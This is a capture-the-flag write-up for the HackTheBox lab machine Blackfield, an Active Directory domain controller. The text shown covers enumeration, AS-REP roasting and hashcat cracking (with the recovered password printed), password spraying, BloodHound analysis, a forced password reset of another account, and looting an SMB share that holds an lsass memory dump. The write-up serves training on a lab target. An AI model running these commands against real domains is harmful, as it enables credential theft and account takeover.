---
render_with_liquid: false
title: HackTheBox Writeup  Blackfield
date: 2024-02-07 16:33 +1400
tags: [hackthebox, nmap, windows, ad, dnsrecon, gobuster, ldapsearch, netexec, asreproast, hashcat, ldapdomaindump, bloodhound, bloodhound-python, ad-miner, lsass, pypykatz, evil-winrm, ad-backup-operators, backupoperatortoda, commando, mimikatz, impacket, vss-shadow, unix2dos, ntds, print-nightmare, revshell-dll-nim, defense-evasion, av-bypass, nopac, faketime, coercer, oscp-like-2023]
---




# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ pt init '10.129.213.195 BLACKFIELD.local DC01.BLACKFIELD.local DC01'
+------------+--------+----------------+-----------------------+
|  PROFILE   | STATUS |       IP       |        DOMAIN         |
+------------+--------+----------------+-----------------------+
| blackfield | on     | 10.129.213.195 | BLACKFIELD.local      |
| blackfield | on     | 10.129.213.195 | DC01.BLACKFIELD.local |
| blackfield | on     | 10.129.213.195 | DC01                  |
+------------+--------+----------------+-----------------------+
```

## Nmap

```bash

# Nmap 7.94SVN scan initiated Wed Feb  7 15:35:54 2024 as: nmap -sVC --version-all -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,88,135,389,445,593,3268,5985, BLACKFIELD.local
Nmap scan report for BLACKFIELD.local (10.129.213.195)
Host is up, received user-set (0.089s latency).
Scanned at 2024-02-07 15:35:54 CST for 100s

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-02-07 14:36:26Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-02-07T14:37:20
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: 7h00m25s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 59520/tcp): CLEAN (Timeout)
|   Check 2 (port 14302/tcp): CLEAN (Timeout)
|   Check 3 (port 34674/udp): CLEAN (Timeout)
|   Check 4 (port 32598/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Wed Feb  7 15:37:34 2024 -- 1 IP address (1 host up) scanned in 99.89 seconds
```


## 53 - DNS


### DNS Reverse Lookup

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ dig -p 53 -x BLACKFIELD.local @BLACKFIELD.local
;; communications error to 10.129.213.195#53: timed out

; <<>> DiG 9.19.19-1-Debian <<>> -p 53 -x BLACKFIELD.local @BLACKFIELD.local
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 58632
;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;local.BLACKFIELD.in-addr.arpa. IN      PTR

;; Query time: 4178 msec
;; SERVER: 10.129.213.195#53(BLACKFIELD.local) (UDP)
;; WHEN: Wed Feb 07 15:44:28 CST 2024
;; MSG SIZE  rcvd: 58
```

### DNS Zone Transfer

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ dig AXFR -p 53 @BLACKFIELD.local BLACKFIELD.local

; <<>> DiG 9.19.19-1-Debian <<>> AXFR -p 53 @BLACKFIELD.local BLACKFIELD.local
; (1 server found)
;; global options: +cmd
; Transfer failed.
```

### DnsRecon Default Scan

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ dnsrecon -n BLACKFIELD.local -d BLACKFIELD.local
[*] std: Performing General Enumeration against: BLACKFIELD.local...
[-] DNSSEC is not configured for BLACKFIELD.local
[*]      SOA dc01.BLACKFIELD.local 10.129.213.195
[*]      SOA dc01.BLACKFIELD.local dead:beef::2524:4b51:6d0:2c98
[*]      SOA dc01.BLACKFIELD.local dead:beef::1eb
[*]      NS dc01.BLACKFIELD.local 10.129.213.195
[*]      NS dc01.BLACKFIELD.local dead:beef::2524:4b51:6d0:2c98
[*]      NS dc01.BLACKFIELD.local dead:beef::1eb
[*]      A BLACKFIELD.local 10.129.213.195
[*]      A BLACKFIELD.local 10.129.229.17
[*]      AAAA BLACKFIELD.local dead:beef::2524:4b51:6d0:2c98
[*]      AAAA BLACKFIELD.local dead:beef::1eb
[*]      AAAA BLACKFIELD.local dead:beef::119
[*]      AAAA BLACKFIELD.local dead:beef::b5cb:e71a:d578:9618
[*]      AAAA BLACKFIELD.local dead:beef::dd37:9dd1:5cb:8ff7
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 3268
[+]      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 3268
[+]      SRV _gc._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 3268
[+]      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 88
[+]      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 88
[+]      SRV _kerberos._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 88
[+]      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 389
[+]      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 389
[+]      SRV _ldap._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 389
[+]      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 88
[+]      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 88
[+]      SRV _kerberos._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 88
[+]      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 389
[+]      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 389
[+]      SRV _ldap._tcp.ForestDNSZones.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 389
[+]      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 389
[+]      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 389
[+]      SRV _ldap._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 389
[+]      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 389
[+]      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 389
[+]      SRV _ldap._tcp.pdc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 389
[+]      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 3268
[+]      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 3268
[+]      SRV _ldap._tcp.gc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 3268
[+]      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 88
[+]      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 88
[+]      SRV _kerberos._tcp.dc._msdcs.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 88
[+]      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 464
[+]      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 464
[+]      SRV _kpasswd._tcp.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 464
[+]      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local 10.129.213.195 464
[+]      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::2524:4b51:6d0:2c98 464
[+]      SRV _kpasswd._udp.BLACKFIELD.local dc01.blackfield.local dead:beef::1eb 464
```

### Subdomain Enumeration

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ gobuster dns -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_subdomains.txt -t 100 -d BLACKFIELD.local -r BLACKFIELD.local
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     BLACKFIELD.local
[+] Threads:    100
[+] Resolver:   BLACKFIELD.local
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: gc._msdcs.BLACKFIELD.local

Found: domaindnszones.BLACKFIELD.local

Found: forestdnszones.BLACKFIELD.local

Found: dc01.BLACKFIELD.local

Progress: 114441 / 114442 (100.00%)
===============================================================
Finished
===============================================================
```

## 389 - Ldap

No anonymous binding enabled

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ ldapsearch -H "ldap://$(pt get rhost)" -x -s base namingcontexts

# extended LDIF

#

# LDAPv3

# base <> (default) with scope baseObject

# filter: (objectclass=*)

# requesting: namingcontexts

#


#
dn:
namingcontexts: DC=BLACKFIELD,DC=local
namingcontexts: CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: CN=Schema,CN=Configuration,DC=BLACKFIELD,DC=local
namingcontexts: DC=DomainDnsZones,DC=BLACKFIELD,DC=local
namingcontexts: DC=ForestDnsZones,DC=BLACKFIELD,DC=local


# search result
search: 2
result: 0 Success


# numResponses: 2

# numEntries: 1
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ ldapsearch -H "ldap://$(pt get rhost)" -x -b "DC=BLACKFIELD,DC=local" | tee enum/ldap_all.txt

# extended LDIF

#

# LDAPv3

# base <DC=BLACKFIELD,DC=local> with scope subtree

# filter: (objectclass=*)

# requesting: ALL

#


# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A69, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563


# numResponses: 1
```


## 445 - SMB


### Auth

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb BLACKFIELD.local -u '' -p ''
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\:

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb BLACKFIELD.local -u 'a' -p ''
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\a:
```

### Shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb BLACKFIELD.local -u '' -p '' --shares
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\:
SMB         10.129.213.195  445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb BLACKFIELD.local -u 'a' -p '' --shares
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\a:
SMB         10.129.213.195  445    DC01             [*] Enumerated shares
SMB         10.129.213.195  445    DC01             Share           Permissions     Remark
SMB         10.129.213.195  445    DC01             -----           -----------     ------
SMB         10.129.213.195  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.213.195  445    DC01             C$                              Default share
SMB         10.129.213.195  445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.213.195  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.213.195  445    DC01             NETLOGON                        Logon server share
SMB         10.129.213.195  445    DC01             profiles$       READ
SMB         10.129.213.195  445    DC01             SYSVOL                          Logon server share
```

### Users & Groups

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb BLACKFIELD.local -u 'a' -p '' --rid-brute
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\a:
SMB         10.129.213.195  445    DC01             498: BLACKFIELD\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.213.195  445    DC01             500: BLACKFIELD\Administrator (SidTypeUser)
SMB         10.129.213.195  445    DC01             501: BLACKFIELD\Guest (SidTypeUser)
SMB         10.129.213.195  445    DC01             502: BLACKFIELD\krbtgt (SidTypeUser)
SMB         10.129.213.195  445    DC01             512: BLACKFIELD\Domain Admins (SidTypeGroup)
SMB         10.129.213.195  445    DC01             513: BLACKFIELD\Domain Users (SidTypeGroup)
SMB         10.129.213.195  445    DC01             514: BLACKFIELD\Domain Guests (SidTypeGroup)
SMB         10.129.213.195  445    DC01             515: BLACKFIELD\Domain Computers (SidTypeGroup)
SMB         10.129.213.195  445    DC01             516: BLACKFIELD\Domain Controllers (SidTypeGroup)
SMB         10.129.213.195  445    DC01             517: BLACKFIELD\Cert Publishers (SidTypeAlias)
SMB         10.129.213.195  445    DC01             518: BLACKFIELD\Schema Admins (SidTypeGroup)
SMB         10.129.213.195  445    DC01             519: BLACKFIELD\Enterprise Admins (SidTypeGroup)
SMB         10.129.213.195  445    DC01             520: BLACKFIELD\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.213.195  445    DC01             521: BLACKFIELD\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.213.195  445    DC01             522: BLACKFIELD\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.213.195  445    DC01             525: BLACKFIELD\Protected Users (SidTypeGroup)
SMB         10.129.213.195  445    DC01             526: BLACKFIELD\Key Admins (SidTypeGroup)
SMB         10.129.213.195  445    DC01             527: BLACKFIELD\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.213.195  445    DC01             553: BLACKFIELD\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.213.195  445    DC01             571: BLACKFIELD\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.213.195  445    DC01             572: BLACKFIELD\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.213.195  445    DC01             1000: BLACKFIELD\DC01$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1101: BLACKFIELD\DnsAdmins (SidTypeAlias)
SMB         10.129.213.195  445    DC01             1102: BLACKFIELD\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.213.195  445    DC01             1103: BLACKFIELD\audit2020 (SidTypeUser)
SMB         10.129.213.195  445    DC01             1104: BLACKFIELD\support (SidTypeUser)
SMB         10.129.213.195  445    DC01             1105: BLACKFIELD\BLACKFIELD764430 (SidTypeUser)
[...]
SMB         10.129.213.195  445    DC01             1412: BLACKFIELD\BLACKFIELD438814 (SidTypeUser)
SMB         10.129.213.195  445    DC01             1413: BLACKFIELD\svc_backup (SidTypeUser)
SMB         10.129.213.195  445    DC01             1414: BLACKFIELD\lydericlefebvre (SidTypeUser)
SMB         10.129.213.195  445    DC01             1415: BLACKFIELD\PC01$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1416: BLACKFIELD\PC02$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1417: BLACKFIELD\PC03$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1418: BLACKFIELD\PC04$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1419: BLACKFIELD\PC05$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1420: BLACKFIELD\PC06$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1421: BLACKFIELD\PC07$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1422: BLACKFIELD\PC08$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1423: BLACKFIELD\PC09$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1424: BLACKFIELD\PC10$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1425: BLACKFIELD\PC11$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1426: BLACKFIELD\PC12$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1427: BLACKFIELD\PC13$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1428: BLACKFIELD\SRV-WEB$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1429: BLACKFIELD\SRV-FILE$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1430: BLACKFIELD\SRV-EXCHANGE$ (SidTypeUser)
SMB         10.129.213.195  445    DC01             1431: BLACKFIELD\SRV-INTRANET$ (SidTypeUser)
```


# User Flag
---

## Auth as support

### Asreproasting

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ cat nxc_users.txt | grep SidTypeUser | awk '{print $6}' | awk -F'\' '{print $2}' > ad_users.lst

┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ GetNPUsers.py -request -format hashcat -outputfile asreproastables.txt -usersfile ad_users.lst BLACKFIELD.local/
Impacket v0.12.0.dev1+20240130.154745.97007e8 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User DC01$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$support@BLACKFIELD.LOCAL:cad3a02df265c5fe0de2a8c110b215f5$d9885d6f43887c558c666be9e6dab5651c6a52b39dce7930de3e6b7b3a064234c4f6130456413db7ed321c2cc76f244b6c7fedd3e0818547bc13ee4e1dede296f69c8dab7814473b8fa5eeacc29feb213c292c92451cdbbababfd518e3232b7b90c1d78da4fc1618f1d41f28e9f5d2a29ea4c74043a2422fdc8624bb5678a3f9dbfa97a3f81bbc7886494eab24a632b8bc4f78ed39a2a9ed7a18c3ef34bfcdc89237883c50ee1dc8828b8bd083871b723a870d48432e128b6f5b87890a6dda5d94aee22b66aa6bd730b5bfa0f689f15d6946deebfad7be5913ba9c5ab75d19dc13bfd6794df152326d6f6c3eb076724a478caced
[...]
```

```bash
hashcat asreproastables.txt /opt/wordlists/rockyou.txt -m 18200
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ hashcat asreproastables.txt /opt/wordlists/rockyou.txt -m 18200 --show
$krb5asrep$23$support@BLACKFIELD.LOCAL:cad3a02df265c5fe0de2a8c110b215f5$d9885d6f43887c558c666be9e6dab5651c6a52b39dce7930de3e6b7b3a064234c4f6130456413db7ed321c2cc76f244b6c7fedd3e0818547bc13ee4e1dede296f69c8dab7814473b8fa5eeacc29feb213c292c92451cdbbababfd518e3232b7b90c1d78da4fc1618f1d41f28e9f5d2a29ea4c74043a2422fdc8624bb5678a3f9dbfa97a3f81bbc7886494eab24a632b8bc4f78ed39a2a9ed7a18c3ef34bfcdc89237883c50ee1dc8828b8bd083871b723a870d48432e128b6f5b87890a6dda5d94aee22b66aa6bd730b5bfa0f689f15d6946deebfad7be5913ba9c5ab75d19dc13bfd6794df152326d6f6c3eb076724a478caced:#00^BlackKnight
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'support' -p '#00^BlackKnight'
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```


## Auth as AUDIT2020


### SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'support' -p '#00^BlackKnight' --shares
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
SMB         10.129.213.195  445    DC01             [*] Enumerated shares
SMB         10.129.213.195  445    DC01             Share           Permissions     Remark
SMB         10.129.213.195  445    DC01             -----           -----------     ------
SMB         10.129.213.195  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.213.195  445    DC01             C$                              Default share
SMB         10.129.213.195  445    DC01             forensic                        Forensic / Audit share.
SMB         10.129.213.195  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.213.195  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.213.195  445    DC01             profiles$       READ
SMB         10.129.213.195  445    DC01             SYSVOL          READ            Logon server share
```

Dump `profiles\$` share

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ folders=('profiles$'); for f in $folders; do mkdir -p loot/smb/$f && smbclient "//$(pt get rhost)/$f" -U 'support%#00^BlackKnight' -c "lcd loot/smb/$f; mask \"\"; recurse ON; prompt OFF; mget *"; done
```

There's only directories that's potentially usernames

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ find loot/smb/profiles\$
loot/smb/profiles$
loot/smb/profiles$/MBrambini
loot/smb/profiles$/CKijauskas
loot/smb/profiles$/DPaskalev
loot/smb/profiles$/SAbdulagatov
loot/smb/profiles$/TKnupke
loot/smb/profiles$/TMusselli
loot/smb/profiles$/KMibach
[...]
```


### Password spray

No new valid credential found

```bash
nxc smb $(pt get rhost) -u ad_users.lst -p '#00^BlackKnight' --no-bruteforce --continue-on-success
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ grep '[+]' nxc_support_pass_spray.txt
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight
```


### Ad enumeration

#### ldapdomaindump

```bash
ldapdomaindump -o ldapdomaindump -r $(pt get rhost) -u "$(pt get rhost)\support" -p '#00^BlackKnight'
```

- Windows Server 2019 Standard

![](/assets/obsidian/1b7cd62b135c7ad77ea18904c31e68a7.png)

- Interesting users 
	- `svc_backup` : Winrm, Backup Operator, Password doesn't expire
	- `lydericlefebvre` : VM Creator, Password doesn't expire
	- `audit2020` : Password doesn't expire

![](/assets/obsidian/8f32ff2004b17cfbcb525ac414f7d879.png)

![](/assets/obsidian/cbb54c26bbd419bbcb08c6697bfb642a.png)

Users with description fields :

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ cat ldapdomaindump/domain_users.json | jq '.[].attributes | ((.sAMAccountName | join(",")) + ":" + (.description, .info | select (.!=null) | join(",")))'
"lydericlefebvre:@lydericlefebvre - VM Creator"
"krbtgt:Key Distribution Center Service Account"
"Guest:Built-in account for guest access to the computer/domain"
"Administrator:Built-in account for administering the computer/domain"
```

#### Bloodhound

```bash
mkdir -p bloodhound-result && cd bloodhound-result && bloodhound-python -d $(pt get rhost) -ns $(cat ../.pt/hosts | awk '{print $1}') -u 'support' -p '#00^BlackKnight' -c all
sudo neo4j start
```

- I can become admin on `WIN-VR6ZPWEPMK3`
- I can force change `AUDIT2020`'s password

![](/assets/obsidian/42d33b2bd90aa22ddc794bce6db97f09.png)

#### Ad-miner

```bash
AD-miner -c -cf cascade.local -u neo4j -p $PASSWORD
```

![](/assets/obsidian/37542da4b1ce638d44158b76f65076eb.png)

### Change AUDIT2020's password

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ net rpc password "AUDIT2020" "Bravosec2024" -U "AUDIT2020"/"support"%"#00^BlackKnight" -S "DC01"
```

Command execution successful

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'AUDIT2020' -p 'Bravosec2024'
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\AUDIT2020:Bravosec2024
```

## Shell as svc_backup


### SMB shares

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ nxc smb $(pt get rhost) -u 'AUDIT2020' -p 'Bravosec2024' --shares
SMB         10.129.213.195  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
SMB         10.129.213.195  445    DC01             [+] BLACKFIELD.local\AUDIT2020:Bravosec2024
SMB         10.129.213.195  445    DC01             [*] Enumerated shares
SMB         10.129.213.195  445    DC01             Share           Permissions     Remark
SMB         10.129.213.195  445    DC01             -----           -----------     ------
SMB         10.129.213.195  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.213.195  445    DC01             C$                              Default share
SMB         10.129.213.195  445    DC01             forensic        READ            Forensic / Audit share.
SMB         10.129.213.195  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.213.195  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.213.195  445    DC01             profiles$       READ
SMB         10.129.213.195  445    DC01             SYSVOL          READ            Logon server share
```

Dump files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Blackfield]
└─$ folders=('forensic'); for f in $folders; do mkdir -p loot/smb/$f && smbclient "//$(pt get rhost)/$f" -U 'AUDIT2020%Bravosec2024' -c "lcd loot/smb/$f; mask \"\"; recurse ON; prompt OFF; mget *"; done
getting file \commands_output\domain_admins.txt of size 528 as commands_output/domain_admins.txt (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
getting file \commands_output\domain_groups.txt of size 962 as commands_output/domain_groups.txt (2.5 KiloBytes/sec) (average 1.9 KiloBytes/sec)
getting file \commands_output\domain_users.txt of size 16454 as commands_output/domain_users.txt (41.6 KiloBytes/sec) (average 15.4 KiloBytes/sec)
getting file \commands_output\firewall_rules.txt of size 518202 as commands_output/firewall_rules.txt (602.4 KiloBytes/sec) (average 265.0 KiloBytes/sec)
getting file \commands_output\ipconfig.txt of size 1782 as commands_output/ipconfig.txt (4.6 KiloBytes/sec) (average 223.4 KiloBytes/sec)
getting file \commands_output\netstat.txt of size 3842 as commands_output/netstat.txt (10.1 KiloBytes/sec) (average 194.3 KiloBytes/sec)
getting file \commands_output\route.txt of size 3976 as commands_output/route.txt (10.5 KiloBytes/sec) (average 172.3 KiloBytes/sec)
getting file \commands_output\systeminfo.txt of size 4550 as commands_output/systeminfo.txt (11.8 KiloBytes/sec) (average 154.8 KiloBytes/sec)
getting file \commands_output\tasklist.txt of size 9990 as commands_output/tasklist.txt (26.0 KiloBytes/sec) (average 142.3 KiloBytes/sec)
getting file \memory_analysis\conhost.zip of size 37876530 as memory_analysis/conhost.zip (1914.3 KiloBytes/sec) (average 1620.2 KiloBytes/sec)
getting file \memory_analysis\ctfmon.zip of size 24962333 as memory_analysis/ctfmon.zip (2615.9 KiloBytes/sec) (average 1905.8 KiloBytes/sec)
getting file \memory_analysis\dfsrs.zip of size 23993305 as memory_analysis/dfsrs.zip (1927.5 KiloBytes/sec) (average 1911.7 KiloBytes/sec)
getting file \memory_analysis\dllhost.zip of size 18366396 as memory_analysis/dllhost.zip (1817.4 KiloBytes/sec) (average 1894.6 KiloBytes/sec)
getting file \memory_analysis\ismserv.zip of size 8810157 as memory_analysis/ismserv.zip (1256.4 KiloBytes/sec) (average 1823.4 KiloBytes/sec)
getting file \memory_analysis\lsass.zip of size 41936098 as memory_analysis/lsass.zip (2096.1 KiloBytes/sec) (average 1889.3 KiloBytes/sec)
[...]
getting file \tools\sleuthkit-4.8.0-win32\NEWS.txt of size 87015 as tools/sleuthkit-4.8.0-win32/NEWS.txt (220.7 KiloBytes/sec) (average 1834.0 KiloBytes/sec)
getting file \tools\sleuthkit-4.8.0-win32\README-win32.txt of size 2324 as tools/sleuthkit-4.8.0-win32/README-win32.txt (6.1 KiloBytes/sec) (average 1831.5 KiloBytes/sec)
getting file \tools\sleuthkit-4.8.0-win32\README.txt of size 8316 as tools/sleuthkit-4.8.0-win32/README.txt (21.5 KiloBytes/sec) (average 1829.1 KiloBytes/sec)
getting file \tools\sysinternals\accesschk.exe of size 792208 as tools/sysinternals/accesschk.exe (787.8 KiloBytes/sec) (average 1825.4 KiloBytes/sec)
[...]
